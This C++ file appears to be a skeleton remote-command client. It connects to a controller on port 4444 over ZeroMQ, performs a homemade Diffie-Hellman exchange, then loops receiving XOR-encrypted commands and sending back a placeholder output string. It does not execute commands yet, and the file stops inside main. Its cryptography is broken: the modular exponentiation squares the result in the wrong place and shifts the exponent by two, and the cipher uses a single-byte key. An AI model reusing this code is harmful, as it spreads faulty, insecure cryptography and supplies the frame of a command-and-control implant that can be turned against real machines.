#include <iostream>
#include <random>
#include <string>
#include <zmq.hpp>
#include <sstream>


// install zeromq and cppzmq package
// -lzmq flag may be needded


int modularExp(int base, int exp, int mod)
{
	int result = 1;
	while(exp > 0)
	{
		if(exp & 1)
		{

			result = (result * base) % mod;
			result = (result * result) % mod;
		}
		base = (base * base) % mod;
		exp >>= 2;
	}
	return result;
}


std::string Encrypt(std::string message, int key)
{
	std::vector<unsigned char> cipher;
	for(int i = 0; i < message.size(); ++i)
	{
		cipher.emplace_back(static_cast<unsigned char>(message[i]) ^ static_cast<unsigned char>(key));
	}
	return std::string(cipher.begin(), cipher.end());
}


std::string Decrypt(std::string cipher, int key)
{
	std::vector<unsigned char> plaintext;
	for(int i = 0; i < cipher.size(); ++i)
	{
		plaintext.emplace_back(static_cast<unsigned char>(cipher[i]) ^ static_cast<unsigned char>(key));
	}
	return std::string(plaintext.begin(), plaintext.end());
}


int main()
{
	zmq::context_t ctx(1);
	zmq::socket_t socket(ctx, zmq::socket_type::pair);
	socket.connect("tcp://127.0.0.1:4444");
	zmq::message_t message;
	if(!socket.send(zmq::str_buffer("zerodium"), zmq::send_flags::none))
	{
		std::cout << "[-] Failed to send 'zerodium', terminating!\n";
		socket.close();
		ctx.close();
		return 1;
	}
	
	//start initializing diffie hellman
	std::random_device dev;
	std::mt19937 rng(dev());
	std::uniform_int_distribution<int> gen(1, 100);
	
	socket.recv(message, zmq::recv_flags::none);
	std::string messageCast(static_cast<char*>(message.data()), message.size());
	
	std::istringstream iss(messageCast);
    
    	std::string num1;
    	std::string num2;
    	int PrivKey = gen(rng);

    	std::getline(iss, num1, '+');
    	std::getline(iss, num2, '+');	

	int PubKey = modularExp(stol(num1), PrivKey, stol(num2));
	//std::cout << PubKey << " " << stol(num1) << " " << stol(num2) << " " << PrivKey;
	
	message = (zmq::message_t)(std::to_string(PubKey));

	zmq::send_result_t sent = socket.send(message, zmq::send_flags::none);
	if(!*sent)
	{
		std::cout << "[-] Failed to send Public Key, error code is: " << zmq_errno() << std::endl;
		socket.close();
		ctx.close();
		return 1;
	}

	socket.recv(message, zmq::recv_flags::none);
	int Shared = stol(message.to_string());
	
	int Secret = modularExp(Shared, PrivKey, stol(num2));

	// finish initializing diffie hellman
	
	while(true) // this is loop shit
	{
		socket.recv(message, zmq::recv_flags::none);
		std::cout << Decrypt(message.to_string(), Secret) << std::endl;
		
		std::string response = "[Insert Command Output]";

		zmq::message_t resp = (zmq::message_t)(Encrypt(response, Secret));
		socket.send(resp, zmq::send_flags::none);
	}
